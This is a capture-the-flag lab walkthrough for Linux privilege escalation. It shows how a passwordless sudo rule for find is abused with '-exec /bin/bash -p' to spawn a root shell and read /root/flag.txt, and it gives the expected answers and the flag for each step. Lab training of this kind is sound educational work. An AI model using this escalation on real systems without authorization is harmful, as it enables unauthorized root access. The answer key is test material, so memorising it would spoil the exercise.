# Sudo Find PrivEsc (Easy)

## Goal

Abuse a limited sudo rule and read:

```text
FLAG{sudo_find_priv_esc}
```

## Platform Session

Open the terminal from the lab platform. The commands below are meant to be executed directly in the provided `student` shell.

## Step 1. Enumerate Sudo Rights

List what the `student` user may run:

```bash
sudo -l
```

You should see that this command is allowed without a password:

```text
/usr/bin/find
```

Submit for step 1:

```text
/usr/bin/find
```

## Step 2. Abuse `find`

`find` can execute commands through `-exec`. Because sudo allows it as root, use it to spawn a root shell:

```bash
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

Confirm the context:

```bash
id
whoami
```

Submit for step 2:

```text
root
```

## Step 3. Capture The Flag

From the root shell:

```bash
cat /root/flag.txt
```

Submit:

```text
FLAG{sudo_find_priv_esc}
```

## Full Solve

```bash
sudo -l
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
cat /root/flag.txt
```
